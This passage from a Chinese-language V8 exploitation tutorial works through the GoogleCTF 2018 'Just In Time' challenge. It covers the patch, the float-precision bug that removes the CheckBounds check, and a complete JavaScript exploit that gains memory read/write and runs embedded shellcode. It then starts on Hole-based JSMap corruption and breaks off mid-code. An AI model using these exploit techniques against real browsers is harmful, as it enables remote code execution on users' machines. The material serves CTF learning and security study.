class="number">22</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">15</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">15</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">31</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">31</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode_addr = <span class="title function_">address_of</span>(shellcode) + <span class="number">0x30n</span>;</span><br><span class="line"><span class="title function_">write</span>(shellcode_addr, <span class="title function_">read</span>(shellcode_addr) + <span class="number">0x6en</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="例题：GoogleCTF2018-Just-In-Time"><a href="#例题：GoogleCTF2018-Just-In-Time" class="headerlink" title="例题：GoogleCTF2018 Just In Time"></a>例题：GoogleCTF2018 Just In Time</h2><h3 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/googlectf2018_jistintime" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /path/to/v8</span><br><span class="line">git checkout 7.0.276.3 </span><br><span class="line">gclient sync </span><br><span class="line">patch -p1 &lt; ./path/to/addition-reducer.patch </span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是在 simplified lowering 阶段想要去掉 <code>CheckBounds</code> 检查的一个必要条件是 <code>poisoning_level_</code> 等于 <code>kDontPoison</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c715c2cbead24ee0efb738494aecc84b.png"
                      alt="在这里插入图片描述"
                ><br>搜索 <code>poisoning_level_</code> 发现如下初始化代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">SimplifiedLowering::<span class="built_in">SimplifiedLowering</span>(JSGraph* jsgraph,</span><br><span class="line">                                       JSHeapBroker* js_heap_broker, Zone* zone,</span><br><span class="line">                                       SourcePositionTable* source_positions,</span><br><span class="line">                                       NodeOriginTable* node_origins,</span><br><span class="line">                                       PoisoningMitigationLevel poisoning_level)</span><br><span class="line">    : <span class="built_in">jsgraph_</span>(jsgraph),</span><br><span class="line">      <span class="built_in">js_heap_broker_</span>(js_heap_broker),</span><br><span class="line">      <span class="built_in">zone_</span>(zone),</span><br><span class="line">      <span class="built_in">type_cache_</span>(TypeCache::<span class="built_in">Get</span>()),</span><br><span class="line">      <span class="built_in">source_positions_</span>(source_positions),</span><br><span class="line">      <span class="built_in">node_origins_</span>(node_origins),</span><br><span class="line">      <span class="built_in">poisoning_level_</span>(poisoning_level) &#123;&#125;</span><br></pre></td></tr></table></figure></div>
<p>进一步搜索，发现 <code>poisoning_level_</code> 是被 <code>data-&gt;info()-&gt;GetPoisoningMitigationLevel()</code> 初始化的。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">SimplifiedLoweringPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;simplified lowering&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    <span class="function">SimplifiedLowering <span class="title">lowering</span><span class="params">(data-&gt;jsgraph(), data-&gt;js_heap_broker(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                temp_zone, data-&gt;source_positions(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                data-&gt;node_origins(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                data-&gt;info()-&gt;GetPoisoningMitigationLevel())</span></span>;</span><br><span class="line">    lowering.<span class="built_in">LowerAllNodes</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>搜索 <code>GetPoisoningMitigationLevel</code> 发现如下相关函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">PoisoningMitigationLevel poisoning_level_ =</span><br><span class="line">    PoisoningMitigationLevel::kDontPoison;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetPoisoningMitigationLevel</span><span class="params">(PoisoningMitigationLevel poisoning_level)</span> </span>&#123;</span><br><span class="line">  poisoning_level_ = poisoning_level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PoisoningMitigationLevel <span class="title">GetPoisoningMitigationLevel</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> poisoning_level_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>poisoning_level_</code> 的初始化与 <code>V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS</code> 有关：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DISABLE_UNTRUSTED_CODE_MITIGATIONS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS false</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS true</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="built_in">DEFINE_BOOL</span>(untrusted_code_mitigations, V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS,</span><br><span class="line">            <span class="string">&quot;Enable mitigations for executing untrusted code&quot;</span>)</span><br><span class="line"><span class="built_in">DEFINE_BOOL</span>(branch_load_poisoning, <span class="literal">false</span>, <span class="string">&quot;Mask loads with branch conditions.&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Compute and set poisoning level.</span></span><br><span class="line">  PoisoningMitigationLevel load_poisoning =</span><br><span class="line">      PoisoningMitigationLevel::kDontPoison;</span><br><span class="line">  <span class="keyword">if</span> (FLAG_branch_load_poisoning) &#123;</span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonAll;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FLAG_untrusted_code_mitigations) &#123;</span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonCriticalOnly;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">compilation_info</span>()-&gt;<span class="built_in">SetPoisoningMitigationLevel</span>(load_poisoning);</span><br></pre></td></tr></table></figure></div>
<p>因此需要将 <code>#define V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS true</code> 修改为 <code>#define V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS false</code> 才能触发 oob 。</p>
<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>分析 patch 文件，发现在 type lowering 阶段添加了如下优化：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">diff --git a/src/compiler/duplicate-addition-reducer.cc b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line"><span class="keyword">new</span> file mode <span class="number">100644</span></span><br><span class="line">index <span class="number">0000000000.</span><span class="number">.59e8437f</span>3d</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line">@@ <span class="number">-0</span>,<span class="number">0</span> <span class="number">+1</span>,<span class="number">71</span> @@</span><br><span class="line">+<span class="comment">// Copyright 2018 Google LLC</span></span><br><span class="line">+<span class="comment">//</span></span><br><span class="line">+<span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line">+<span class="comment">// you may not use this file except in compliance with the License.</span></span><br><span class="line">+<span class="comment">// You may obtain a copy of the License at</span></span><br><span class="line">+<span class="comment">//</span></span><br><span class="line">+<span class="comment">//      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line">+<span class="comment">//</span></span><br><span class="line">+<span class="comment">// Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line">+<span class="comment">// distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line">+<span class="comment">// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line">+<span class="comment">// See the License for the specific language governing permissions and</span></span><br><span class="line">+<span class="comment">// limitations under the License.</span></span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/duplicate-addition-reducer.h&quot;</span></span></span><br><span class="line">+</span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/common-operator.h&quot;</span></span></span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/graph.h&quot;</span></span></span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/node-properties.h&quot;</span></span></span><br><span class="line">+</span><br><span class="line">+<span class="keyword">namespace</span> v8 &#123;</span><br><span class="line">+<span class="keyword">namespace</span> internal &#123;</span><br><span class="line">+<span class="keyword">namespace</span> compiler &#123;</span><br><span class="line">+</span><br><span class="line">+DuplicateAdditionReducer::<span class="built_in">DuplicateAdditionReducer</span>(Editor* editor, Graph* graph,</span><br><span class="line">+                     CommonOperatorBuilder* common)</span><br><span class="line">+    : <span class="built_in">AdvancedReducer</span>(editor),</span><br><span class="line">+      <span class="built_in">graph_</span>(graph), <span class="built_in">common_</span>(common) &#123;&#125;</span><br><span class="line">+</span><br><span class="line">+Reduction DuplicateAdditionReducer::<span class="built_in">Reduce</span>(Node* node) &#123;</span><br><span class="line">+  <span class="keyword">switch</span> (node-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">+    <span class="keyword">case</span> IrOpcode::kNumberAdd:</span><br><span class="line">+      <span class="keyword">return</span> <span class="built_in">ReduceAddition</span>(node);</span><br><span class="line">+    <span class="keyword">default</span>:</span><br><span class="line">+      <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="function">Reduction <span class="title">DuplicateAdditionReducer::ReduceAddition</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">+  <span class="built_in">DCHECK_EQ</span>(node-&gt;<span class="built_in">op</span>()-&gt;<span class="built_in">ControlInputCount</span>(), <span class="number">0</span>);</span><br><span class="line">+  <span class="built_in">DCHECK_EQ</span>(node-&gt;<span class="built_in">op</span>()-&gt;<span class="built_in">EffectInputCount</span>(), <span class="number">0</span>);</span><br><span class="line">+  <span class="built_in">DCHECK_EQ</span>(node-&gt;<span class="built_in">op</span>()-&gt;<span class="built_in">ValueInputCount</span>(), <span class="number">2</span>);</span><br><span class="line">+</span><br><span class="line">+  Node* left = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">0</span>);</span><br><span class="line">+  <span class="keyword">if</span> (left-&gt;<span class="built_in">opcode</span>() != node-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">+    <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* right = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">1</span>);</span><br><span class="line">+  <span class="keyword">if</span> (right-&gt;<span class="built_in">opcode</span>() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* parent_left = NodeProperties::<span class="built_in">GetValueInput</span>(left, <span class="number">0</span>);</span><br><span class="line">+  Node* parent_right = NodeProperties::<span class="built_in">GetValueInput</span>(left, <span class="number">1</span>);</span><br><span class="line">+  <span class="keyword">if</span> (parent_right-&gt;<span class="built_in">opcode</span>() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="type">double</span> const1 = <span class="built_in">OpParameter</span>&lt;<span class="type">double</span>&gt;(right-&gt;<span class="built_in">op</span>());</span><br><span class="line">+  <span class="type">double</span> const2 = <span class="built_in">OpParameter</span>&lt;<span class="type">double</span>&gt;(parent_right-&gt;<span class="built_in">op</span>());</span><br><span class="line">+  Node* new_const = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">NumberConstant</span>(const1+const2));</span><br><span class="line">+</span><br><span class="line">+  NodeProperties::<span class="built_in">ReplaceValueInput</span>(node, parent_left, <span class="number">0</span>);</span><br><span class="line">+  NodeProperties::<span class="built_in">ReplaceValueInput</span>(node, new_const, <span class="number">1</span>);</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+&#125;  <span class="comment">// namespace compiler</span></span><br><span class="line">+&#125;  <span class="comment">// namespace internal</span></span><br><span class="line">+&#125;  <span class="comment">// namespace v8</span></span><br></pre></td></tr></table></figure></div>
<p>这个优化实际就是常量折叠，例如 <code>x + 1 + 2</code> 可以被优化为 <code>x + 3</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/396b253a6f7d07391ea464da03a86df5.png"
                      alt="在这里插入图片描述"
                ></p>
<p>浮点数中有一个上界 9007199254740992 ，当达到这个数时精度不能保证。例如 <code>9007199254740991 + 1 = 9007199254740992</code> 但是 <code>9007199254740992 + 1 = 9007199254740992</code> ，<code>9007199254740992 + 2 = 9007199254740994</code> 。我们可以通过二分得到这个上界。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> l = <span class="number">0</span>, r = std::numeric_limits&lt;<span class="type">uint64_t</span>&gt;::<span class="built_in">max</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">uint64_t</span> m = (__int128(l) + r) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">double</span>(m) == <span class="built_in">double</span>(m) + <span class="number">1</span>) &#123;</span><br><span class="line">            r = m;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            l = m + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">double</span>(l) == <span class="built_in">double</span>(l) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; l &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于 type lowering 优化位于计算范围的 typer 之后并且位于优化 <code>CheckBounds</code> 的 simplified lowering 之前，因此可以通过上面的特性利用题目添加的优化为 simplified lowering 提供一个错误的范围使得 <code>CheckBounds</code> 被优化掉造成 oob 。</p>
<p>因此有如下 POC ：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/7237de6f4b9bdc2deda37409e6db7a10.png"
                      alt="在这里插入图片描述"
                ><br>这里有几个需要注意的问题：</p>
<ul>
<li>需要有一个 <code>x == 1 ? 9007199254740992 : 9007199254740988</code> 条件分枝确保 <code>9007199254740992 + 1 + 1 + 1</code> 优化成 <code>9007199254740992 + 3</code> 而不是 <code>9007199254740992</code> 。</li>
<li><code>9007199254740992 - n - 1</code> 是为了确保加上后面的 n 个 <code>+ 1</code> 不和 <code>9007199254740992</code> 加上后面的 n 个 <code>+ 1</code> 相同，否则会和上面那个情况一样被优化成 <code>9007199254740992</code> 。</li>
</ul>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> oob_array = [<span class="number">.1</span>, <span class="number">.2</span>];</span><br><span class="line">        <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740988</span>) + <span class="number">1</span> + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">        t -= <span class="number">9007199254740991</span>;</span><br><span class="line">        oob_array[t] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> oob_array;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">foo</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oob_array = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">16</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">23</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">16</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">16</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">32</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">32</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode_addr = <span class="title function_">address_of</span>(shellcode) + <span class="number">0x30n</span>;</span><br><span class="line"><span class="title function_">write</span>(shellcode_addr, <span class="title function_">read</span>(shellcode_addr) + <span class="number">0x6en</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h1 id="Hole"><a href="#Hole" class="headerlink" title="Hole"></a>Hole</h1><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p><code>Hole</code> 是 JS 内部的一种数据类型，用来标记不存在的元素，与 C++ 中的 <code>nullptr</code>  类似，不过这个数据类型通常是不会泄露至用户。</p>
<p>Hole 类型的漏洞利用是指由于内部数据结构 <code>Hole</code> 通过漏洞被暴露至用户层，因此可以根据 <code>Hole</code> 创建⼀个长度为 -1 的 <code>JSMap</code> 结构，导致越界读写，并造成 RCE。</p>
<p>根据前面对 <code>JSMap</code> 结构的分析可知，当一个元素被从 <code>JSMap</code> 删除的时候 JS 会将该元素对应的 <code>Entry</code> 的 <code>key</code> 和 <code>value</code> 修改为 <code>Hole</code> 。如果我们往 <code>JSMap</code> 中加入一个 <code>key</code> 为 <code>Hole</code> 的元素就可以一直删除 <code>key</code> 为 <code>Hole</code> 的元素。不过实际上由于 shrink 操作会清除 <code>JSMap</code> 中的 <code>Hole</code> 因此需要具体分析。</p>
<p>有如下示例（commit:<code>4a03d61accede9dd0e3e6dc0456ff5a0e3f792b4</code>）：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">let</span> hole = % <span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br></pre></td></tr></table></figure></div>

<p>这里 <code>map.set(1, 1)</code> 的作用是为了确保两次 <code>map.delete(hole)</code> 后才出现 shrink 操作。之后的 <code>map.delete(1)</code> 使得 <code>map.size</code> 变为 -1 。</p>
<p>根据前面对 <code>JSMap</code> 结构的分析以及实际调试可知 <code>JSMap</code> 的关键结构如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/94d2fd0ea7b951e9588f1ec29419d91e.png"
                      alt="在这里插入图片描述"
                ><br>之后再次向 <code>JSMap</code> 中添加元素。由于 <code>JSMap</code> 中没有待添加元素的 <code>key</code> ，因此会在 <code>elements</code> 中写入新的 <code>Entry</code> 。而新的 <code>Entry</code> 的地址的计算方式是 <code>&amp;buckets + number_of_buckets + (new_number_of_elements + new_number_of_deleted) * 3</code>（统一按照 <code>buckets</code> 元素大小计算）  ，由于经过了 shrink 操作，这三个值分别为：</p>
<ul>
<li><code>number_of_elements</code>: -1</li>
<li><code>number_of_deleted</code>: 0</li>
<li><code>number_of_buckets</code>: 2</li>
</ul>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">   occupancy = <span class="title class_">IntPtrAdd</span>(new_number_of_elements, new_number_of_deleted);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">TNode</span>&lt;<span class="title class_">IntPtrT</span>&gt; entry_start = <span class="title class_">IntPtrAdd</span>(</span><br><span class="line">     <span class="title class_">IntPtrMul</span>(occupancy, <span class="title class_">IntPtrConstant</span>(<span class="title class_">OrderedHashMap</span>::kEntrySize)),</span><br><span class="line">     number_of_buckets);</span><br><span class="line"> <span class="title class_">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">     table, entry_start, key, <span class="variable constant_">UPDATE_WRITE_BARRIER</span>,</span><br><span class="line">     kTaggedSize * <span class="title class_">OrderedHashMap</span>::<span class="title class_">HashTableStartIndex</span>());</span><br><span class="line"> <span class="title class_">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">     table, entry_start, value, <span class="variable constant_">UPDATE_WRITE_BARRIER</span>,</span><br><span class="line">     kTaggedSize * (<span class="title class_">OrderedHashMap</span>::<span class="title class_">HashTableStartIndex</span>() +</span><br><span class="line">                    <span 